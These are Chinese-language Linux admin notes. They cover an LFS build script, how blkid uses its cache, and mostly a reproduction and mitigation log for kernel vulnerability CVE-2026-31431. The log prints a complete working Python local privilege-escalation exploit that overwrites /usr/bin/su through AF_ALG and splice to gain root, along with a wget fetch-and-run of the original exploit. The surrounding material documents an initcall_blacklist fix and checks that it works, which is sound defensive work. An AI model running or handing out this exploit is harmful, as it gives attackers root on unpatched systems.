
# linux部分基础
```shell
# shell脚本的格式
lfs@ub24-1:/mnt/lfs/sources$ vim build_temp_tools.sh
# 定义变量
#!/usr/bin/env bash                     # 和#!/bin/bash有区别
# 遇到报错后立刻停止
set -e
set -o pipefail

LOG=/mnt/lfs/build.log
exec > >(tee -a $LOG) 2>&1

echo "==== LFS TEMP TOOLCHAIN BUILD START ===="

# �~_��~@�~O~X�~G~O
export LFS=/mnt/lfs
export LFS_TGT=$(uname -m)-lfs-linux-gnu
export PATH=$LFS/tools/bin:/usr/bin:/bin

cd $LFS/sources
build_binutils_pass1() {
    echo ">>> binutils pass1"
    tar xf binutils-*.tar.*
    cd binutils-2.46.0
   mkdir -v build && cd build

    ../configure --prefix=$LFS/tools ....
...
    ....
}

build_gcc_pass1() {
    echo ">>> gcc pass1"
    tar xf gcc-*.tar.*
    cd gcc-15.2.0

    tar xf ../mpfr-*.tar.* && mv mpfr-* mpfr
....
    ....
}

build_linux_headers() {
    echo ">>> linux headers"
    tar xf linux-*.tar.*
....
    
}

main() {
    build_binutils_pass1
    build_gcc_pass1
    build_linux_headers
    build_glibc
}

main

echo "==== BUILD COMPLETE ===="

```




# CVE-2026-31431复现前奏
```shell
即使 exp 是破坏型的，所以你不应该用“是否破坏成功”来验证修复
正确做法是观察“漏洞触发路径是否被阻断”（返回值 / syscall / 权限）

modprobe.d中的文件出现报错：Module algif_aead is builtin 的原因
内置模块（Builtin） 是编译在内核文件 vmlinuz 内部的，它们在系统启动的第一秒就已经存在于内存中了。

initcall_blacklist是内核的高级启动指令
原理：虽然代码（树）已经在内核（土）里了，但内核在启动时需要调用一个“初始化函数”（比如 algif_aead_init）来把这个功能激活
效果：grubby 通过修改引导参数，直接告诉内核：“在启动过程中，不准运行这两个初始化函数”
结论：函数不运行，功能就不会激活。这是处理 Builtin 模块漏洞的最强手段


风险点： 如果你的服务器使用了磁盘加密（LUKS）或者复杂的 IPsec 隧道，新内核可能会因为加解密模块的变动导致挂载根目录失败
规避方案： 检查/etc/fstab，确保使用的是UUID挂载而非设备名（如 /dev/vda1），因为新内核对磁盘顺序的识别可能发生漂移
在重启前，你可以将 SELinux 设置为 Permissive 模式。这样即使有权限冲突，系统也会允许启动并记录日志，而不是直接崩溃

如果之前用 kpatch 或手动编译过补丁，先设法卸载它们

CVE-2026-31431 相关的漏洞代码主要存在于较新的内核（通常是4.14+ 或更高版本）中的 Crypto 接口, 即使 https://copy.fail/#exploit 上说:
"The same 732-byte Python script roots every Linux distribution shipped since 2017."
它需要python3为前提，CentOS7系全是python2, 如果要在centos7系上运行该exp需要安装python3环境


```

| 操作系统 | 默认状态 | 修复策略 | 验证手段 |
| :--- | :--- | :--- | :--- |
| **Ubuntu 18-24** | 易感（模块加载） | `apt upgrade` 或禁用 `algif_aead` 模块 | 运行 EXP 报 `Errno 97` |
| **CentOS 9 / Rocky 9** | 易感（内置代码） | `grubby` 禁用 `initcall_blacklist` | 运行 EXP 报 `Errno 97` |
| **CentOS 7.9** | 通常免疫 | 内核太旧，原生不支持受影响的 Crypto 路径 | 运行 EXP 直接报错 |


## 在centos8-10上
```shell
[rambo@master ~]# uname -r
5.14.0-601.el9.x86_64

[rambo@master ~]# ls -alh /boot/vmlinuz-5.14.0-6*
-rwxr-xr-x. 1 root root 15M Jul 22  2025 /boot/vmlinuz-5.14.0-601.el9.x86_64        # 仅有当前使用的这个内核



# 漏洞复现
[rambo@centos9 ~]# wget https://copy.fail/exp
[rambo@centos9 ~]# python3 exp && su 
Traceback (most recent call last):
  File "/root/exp", line 9, in <module>
    while i<len(e):c(f,i,e[i:i+4]);i+=4
  File "/root/exp", line 5, in c
    a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
AttributeError: module 'os' has no attribute 'splice'


这个报错是因为 os.splice 并不是 Python 标准库在所有平台/版本下都直接暴露的函数
原因：splice() 是一个 Linux 特有的系统调用。虽然 Python 3.10+ 在某些构建版本中包含了它，但如果 Python 是在没有正确链接相关头文件的环境下编译的（或者版本较旧），os 模块里就不会有这个属性
修复方法：你需要手动使用 ctypes 来调用 C 标准库中的 splice


# 修改脚本
[rambo@centos9 ~]# mv exp{,.bak}                 # 执行官方的exp也是下述效果
[rambo@centos9 ~]# vim exp                       # 调整exp的内容让其支持splice
#!/usr/bin/env python3
import os as g, zlib, socket as s, ctypes

# --- 修复代码开始：手动注入 splice 系统调用 ---
libc = ctypes.CDLL('libc.so.6')
def splice_fix(src_fd, dst_fd, length, offset_src=None, offset_dst=None, flags=0):
    off_in = ctypes.byref(ctypes.c_long(offset_src)) if offset_src is not None else None
    off_out = ctypes.byref(ctypes.c_long(offset_dst)) if offset_dst is not None else None
    return libc.splice(src_fd, off_in, dst_fd, off_out, length, flags)
# --- 修复代码结束 ---

def d(x): return bytes.fromhex(x)

def c(f, t, c_data):
    # AF_ALG = 38
    a = s.socket(38, 5, 0)
    a.bind(("aead", "authencesn(hmac(sha256),cbc(aes))"))
    h = 279  # SOL_ALG
    v = a.setsockopt
    v(h, 1, d('0800010000000010' + '0' * 64))
    v(h, 5, None, 4)
    u, _ = a.accept()
    o = t + 4
    i = d('00')
    u.sendmsg([b"A" * 4 + c_data], [(h, 3, i * 4), (h, 2, b'\x10' + i * 19), (h, 4, b'\x08' + i * 3)], 32768)
    
    r, w = g.pipe()
    # 使用修复后的 splice 函数
    n = splice_fix
    n(f, w, o, offset_src=0)
    n(r, u.fileno(), o)
    
    try:
        u.recv(8 + t)
    except:
        pass

# 目标文件（通常是具有 SUID 权限的文件）
try:
    f_handle = g.open("/usr/bin/su", g.O_RDONLY)
except:
    print("无法打开目标文件，请检查权限")
    exit()

i = 0
# 这里的 payload 是被压缩后的注入指令
e = zlib.decompress(d("78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"))

while i < len(e):
    c(f_handle, i, e[i:i+4])
    i += 4

print("[+] 注入完成，尝试提权...")
g.system("su")




[rambo@centos9 ~]# python3 exp && su                     # 执行会破坏你的底层环境，请在虚拟机中执行！！！
[+] 注入完成，尝试提权...
[rambo@centos9 root]# id
uid=0(root) gid=0(root) groups=0(root)


# 检查
[rambo@centos9 root]# ls -alh /boot/vmlinuz-5.14.0-6*
-rwxr-xr-x. 1 root root 15M Jul 22  2025 /boot/vmlinuz-5.14.0-601.el9.x86_64         # 旧内核
-rwxr-xr-x  1 root root 15M Apr 22 17:14 /boot/vmlinuz-5.14.0-697.el9.x86_64         # 新内核

[rambo@centos9 root]# /usr/sbin/grubby --default-kernel
/boot/vmlinuz-5.14.0-697.el9.x86_64


# 试着修复时
[rambo@centos9 root]# dnf clean all
[rambo@centos9 root]# dnf update kernel kernel-core
[rambo@centos9 root]# init 0                                            # 完犊子，命令都不管用了，以下是环境破坏后的效果
bash: init: command not found...
Install package 'systemd' to provide command 'init'? [N/y] y


 * Waiting in queue... 
 * Loading list of packages.... 
The following packages have to be updated:
 systemd-252-68.el9.x86_64	System and Service Manager
 systemd-libs-252-68.el9.x86_64	systemd libraries
 systemd-pam-252-68.el9.x86_64	systemd PAM module
 systemd-rpm-macros-252-68.el9.noarch	Macros that define paths and scriptlets related to systemd
 systemd-udev-252-68.el9.x86_64	Rule-based device node and kernel event manager
Proceed with changes? [N/y] y


 * Waiting in queue... 
 * Waiting for authentication... 
 * Waiting in queue... 
 * Loading list of packages.... 
 * Requesting data... 
 * Testing changes... 
 * Installing updates... 
 * Cleaning up packages... 
 * Installing updates... 
 * Cleaning up packages... 
 * Installing updates... 
 * Cleaning up packages... 
 * Installing updates... 
 * Cleaning up packages... 
 * Installing updates... 
 * Cleaning up packages... 
 * Installing updates... 
Failed to launch: 'init': Failed to execute child process “init” (No such file or directory)

[root@centos9 root]# init 0
bash: init: command not found...
Install package 'systemd' to provide command 'init'? [N/y] ^C
[root@centos9 root]# poweroff           
bash: poweroff: command not found...
Similar command is: 'poweroff'
[root@centos9 root]# shutdown 0
bash: shutdown: command not found...
Install package 'systemd' to provide command 'shutdown'? [N/y]


# 真正的修复
虽然模块是内置的，但Linux内核允许在启动时通过参数禁用特定的子系统
# 设置内核黑名单(这是核心)
[rambo@master ~]$ sudo grubby --update-kernel=ALL --args="initcall_blacklist=algif_aead_init,af_alg_init"
注：这会告诉内核在初始化阶段跳过这两个协议栈的加载

它会将 initcall_blacklist=... 参数添加到 /etc/default/grub 文件的 GRUB_CMDLINE_LINUX 行中。这样可以确保下次更新内核（dnf update）时，这个参数依然会被包含在新的内核条目里


# 重启(必须重启，否则旧的初始化依然在内存中)
[rambo@master ~]$ reboot


# 查看参数是否加载
[rambo@master ~]$ cat /proc/cmdline | grep initcall_blacklist
BOOT_IMAGE=(hd0,msdos1)/vmlinuz-5.14.0-601.el9.x86_64 root=UUID=0fc70c62-251f-4b42-a3ce-5c039024ce52 ro crashkernel=1G-2G:192M,2G-64G:256M,64G-:512M resume=UUID=6dc7d390-b7c2-4e80-9ff6-04f7abc7539e rhgb quiet initcall_blacklist=algif_aead_init,af_alg_init


[rambo@master ~]$ grep "initcall_blacklist" /etc/default/grub
GRUB_CMDLINE_LINUX="crashkernel=1G-2G:192M,2G-64G:256M,64G-:512M resume=UUID=6dc7d390-b7c2-4e80-9ff6-04f7abc7539e rhgb quiet initcall_blacklist=algif_aead_init,af_alg_init"



# 再运行上述修改版exp
[rambo@master ~]$ python3 exp && su 
Traceback (most recent call last):
  File "/home/rambo/exp", line 50, in <module>
    c(f_handle, i, e[i:i+4])
  File "/home/rambo/exp", line 16, in c
    a = s.socket(38, 5, 0)
  File "/usr/lib64/python3.9/socket.py", line 232, in __init__
    _socket.socket.__init__(self, family, type, proto, fileno)
OSError: [Errno 97] Address family not supported by protocol            # 报错Protocol not supported

```





## Ubuntu18上
```shell
rambo@ub18-1:~$ sudo vim /etc/default/grub
GRUB_DEFAULT=0
GRUB_TIMEOUT_STYLE=hidden
GRUB_TIMEOUT=0
GRUB_DISTRIBUTOR=`lsb_release -i -s 2> /dev/null || echo Debian`
GRUB_CMDLINE_LINUX_DEFAULT="initcall_blacklist=algif_aead_init,af_alg_init"           # 增加双引号内的条目
GRUB_CMDLINE_LINUX=""


# 更新GRUB配置并重启
rambo@ub18-1:~$ sudo update-grub
Sourcing file `/etc/default/grub'
Generating grub configuration file ...
Found linux image: /boot/vmlinuz-4.15.0-213-generic
Found initrd image: /boot/initrd.img-4.15.0-213-generic
done


rambo@ub18-1:~$ sudo reboot

rambo@ub18-1:~$ cat /proc/cmdline | grep initcall_blacklist
BOOT_IMAGE=/vmlinuz-4.15.0-213-generic root=UUID=ea8e751e-74d9-4b02-a9c4-443c1e3c0511 ro initcall_blacklist=algif_aead_init,af_alg_init

rambo@ub18-1:~$ grep "initcall_blacklist" /etc/default/grub
GRUB_CMDLINE_LINUX_DEFAULT="initcall_blacklist=algif_aead_init,af_alg_init"


# 运行修改后的exp
rambo@ub18-1:~$ python3 exp && su
无法打开目标文件，请检查权限
Password: 
su: Authentication failure
rambo@ub18-1:~$ sudo python3 exp && su
[sudo] password for rambo: 
无法打开目标文件，请检查权限
Password: 
su: Authentication failure
rambo@ub18-1:~$ python3 exp && sudo su
无法打开目标文件，请检查权限
root@ub18-1:/home/rambo# id
uid=0(root) gid=0(root) groups=0(root)
root@ub18-1:/home/rambo# exit
exit
rambo@ub18-1:~$ ls
exp
rambo@ub18-1:~$ lsmod | grep algif
rambo@ub18-1:~$ sudo python3 exp
无法打开目标文件，请检查权限
rambo@ub18-1:~$ ls -alh exp 
-rw-rw-r-- 1 rambo rambo 1.7K May  3 02:14 exp


# 复现就需要修改exp来测试
rambo@ub18-1:~$ echo "test" > /tmp/test.txt
rambo@ub18-1:~$ grep RDONLY exp
#    f_handle = g.open("/usr/bin/su", g.O_RDONLY)           # 修改前
    f_handle = g.open("/tmp/test.txt", g.O_RDONLY)          # 修改后

# 再来执行exp
rambo@ub18-1:~$ sudo python3 exp
Traceback (most recent call last):
  File "exp", line 51, in <module>
    c(f_handle, i, e[i:i+4])
  File "exp", line 16, in c
    a = s.socket(38, 5, 0)
  File "/usr/lib/python3.6/socket.py", line 144, in __init__
    _socket.socket.__init__(self, family, type, proto, fileno)
OSError: [Errno 97] Address family not supported by protocol          # 此时该漏洞已经修复，绝对无法复现提权

释义：
在 Ubuntu 18.04 上看到的“无法打开目标文件”其实是 AppArmor(应用防火墙)挡了一刀
现象：由于 AppArmor 的存在，EXP 脚本甚至没机会去触发内核漏洞，就在读取 /usr/bin/su 时被拦截了
误区：这并不代表“内核没有漏洞”，而只是代表“当前这条攻击路径被系统自带的防护软件挡住了”。如果黑客换一个不受保护的文件作为目标，依然可能绕过AppArmor
这才是真正的修复。 因为现在的系统不是靠“防火墙拦截”，而是靠“内核本身免疫”来抵御攻击

```



## 在ubuntu20-24上
```shell
rambo@ub20-ser-1:~$ grep -v ^# /etc/default/grub | grep -v ^$
GRUB_DEFAULT=0
GRUB_TIMEOUT_STYLE=hidden
GRUB_TIMEOUT=0
GRUB_DISTRIBUTOR=`lsb_release -i -s 2> /dev/null || echo Debian`
GRUB_CMDLINE_LINUX_DEFAULT="maybe-ubiquity initcall_blacklist=algif_aead_init,af_alg_init"         # 同样增加initcall_blacklist
GRUB_CMDLINE_LINUX=""


rambo@ub20-ser-1:~$ sudo update-grub
Sourcing file `/etc/default/grub'
Sourcing file `/etc/default/grub.d/init-select.cfg'
Generating grub configuration file ...
Found linux image: /boot/vmlinuz-5.4.0-204-generic
Found initrd image: /boot/initrd.img-5.4.0-204-generic
done


# 用修改后的exp
rambo@ub20-ser-1:~$ python3 exp && su
Traceback (most recent call last):
  File "exp1", line 50, in <module>
    c(f_handle, i, e[i:i+4])
  File "exp1", line 16, in c
    a = s.socket(38, 5, 0)
  File "/usr/lib/python3.8/socket.py", line 231, in __init__
    _socket.socket.__init__(self, family, type, proto, fileno)
OSError: [Errno 97] Address family not supported by protocol


# 用原版的exp也不行(这里我把exp名字改成了exp1)
rambo@ub20-ser-1:~$ wget https://copy.fail/exp
rambo@ub20-ser-1:~$ python3 exp1 && su
Traceback (most recent call last):
  File "exp", line 9, in <module>
    while i<len(e):c(f,i,e[i:i+4]);i+=4
  File "exp", line 5, in c
    a=s.socket(38,5,0);a.bind(("aead","authencesn(hmac(sha256),cbc(aes))"));h=279;v=a.setsockopt;v(h,1,d('0800010000000010'+'0'*64));v(h,5,None,4);u,_=a.accept();o=t+4;i=d('00');u.sendmsg([b"A"*4+c],[(h,3,i*4),(h,2,b'\x10'+i*19),(h,4,b'\x08'+i*3),],32768);r,w=g.pipe();n=g.splice;n(f,w,o,offset_src=0);n(r,u.fileno(),o)
  File "/usr/lib/python3.8/socket.py", line 231, in __init__
    _socket.socket.__init__(self, family, type, proto, fileno)
OSError: [Errno 97] Address family not supported by protocol


```





# 正确执行blkid却无输出
```shell
# 实验模拟
1. 删除缓存(最直接)
rambo@ub24-1:~$ blkid /dev/sdb3
/dev/sdb3: UUID="4469f1c7-6775-489d-b83c-57df7cc185f4" BLOCK_SIZE="4096" TYPE="ext4" PARTUUID="f1e0f1a6-1fe8-4266-9a57-9a1d31170f5b"

rambo@ub24-1:~$ sudo mv /run/blkid/blkid.tab{,-ak}
Note: 相当于把系统对磁盘的"认知"清空了, 用户态缓存没了,磁盘上的ext4还在/superblock/还在/UUID还在

rambo@ub24-1:~$ blkid /dev/sdb3           # 无输出
强制探测时看到有输出
rambo@ub24-1:~$ sudo blkid -p /dev/sdb3
/dev/sdb3: UUID="4469f1c7-6775-489d-b83c-57df7cc185f4" VERSION="1.0" FSBLOCKSIZE="4096" BLOCK_SIZE="4096" FSLASTBLOCK="14153984" FSSIZE="57974718464" TYPE="ext4" USAGE="filesystem" PART_ENTRY_SCHEME="gpt" PART_ENTRY_UUID="f1e0f1a6-1fe8-4266-9a57-9a1d31170f5b" PART_ENTRY_TYPE="0fc63daf-8483-4772-8e79-3d69d8477de4" PART_ENTRY_NUMBER="3" PART_ENTRY_OFFSET="12595200" PART_ENTRY_SIZE="113231872" PART_ENTRY_DISK="8:16"
Note:
这是"数据面真实情况", 它会：直接读设备/扫描superblock/解析ext4/xfs等

手动刷新(扫描所有设备 → 重建缓存)
rambo@ub24-1:~$ sudo blkid
再来查询
rambo@ub24-1:~$ blkid /dev/sdb3
/dev/sdb3: UUID="4469f1c7-6775-489d-b83c-57df7cc185f4" BLOCK_SIZE="4096" TYPE="ext4" PARTUUID="f1e0f1a6-1fe8-4266-9a57-9a1d31170f5b"


# 性能考虑
如果每次都扫描磁盘,每块都要读superblock会非常慢

# 安全考虑
扫描设备意味着直接读块设备可能触发I/O,有些场景不允许

udev负责更新缓存
# 哪些操作会触发
1. 新磁盘插入
虚拟机挂载新磁盘
👉 内核事件：add event
👉 udev行为：
扫描设备
调用blkid
写入缓存

2. 分区变化
fdisk /dev/sdb
然后partprobe
👉 内核事件：change event
👉 udev重新识别分区 → 更新blkid

3. 文件系统创建(mkfs)
mkfs.ext4 /dev/sdb3
👉 这里很多人误解了：
mkfs本身不会直接更新blkid
但它会导致：
设备内容改变
udev可能触发change事件
👉 udev再调用blkid

4. mount/umount
mount /dev/sdb3 /data
👉 有些发行版会在mount时触发udev 或 systemd 相关服务更新信息
👉 所以你会看到blkid"突然能识别了"

# 哪些操作不会触发
1. 删除blkid缓存
rm /run/blkid/blkid.tab
👉 这是纯用户态行为：
内核不知道 ❌
udev不知道 ❌
👉 所以不会触发任何重新扫描

2.直接读设备
blkid /dev/sdb3
👉 默认模式:
只查缓存
不触发扫描

3. 文件系统内部变化
比如写文件/删除文件
👉 这些不会触发udev


blkid不负责"发现变化",只负责"查询结果"
如果你手动删了缓存，但没有触发udev系统则不会自动重建缓存

总结:
Linux 的设备识别是"事件驱动 + 缓存"的，而不是实时扫描
blkid 默认不扫描磁盘，而是优先读取缓存；缓存没了，它也不会主动去扫单个设备

```
